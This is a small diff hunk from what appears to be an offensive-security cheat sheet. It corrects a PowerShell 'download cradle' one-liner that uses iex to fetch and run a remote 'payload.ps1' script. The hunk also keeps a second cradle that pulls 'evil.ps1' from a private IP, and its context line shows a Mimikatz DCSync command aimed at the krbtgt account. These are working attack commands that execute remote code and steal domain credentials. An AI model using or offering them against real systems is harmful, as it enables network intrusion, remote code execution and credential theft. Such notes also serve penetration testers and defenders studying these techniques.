@@ -277,7 +277,7 @@ lsadump::dcsync /user:DOMAIN\krbtgt
 ### Download cradle
 
 ```
-iex(New-ObjectNet.WebClient).DownloadString('https://webserver/payload.ps1')
+iex(New-Object System.Net.WebClient).DownloadString('https://webserver/payload.ps1')
 iex(iwr'http://192.168.230.1/evil.ps1')
 ```
 
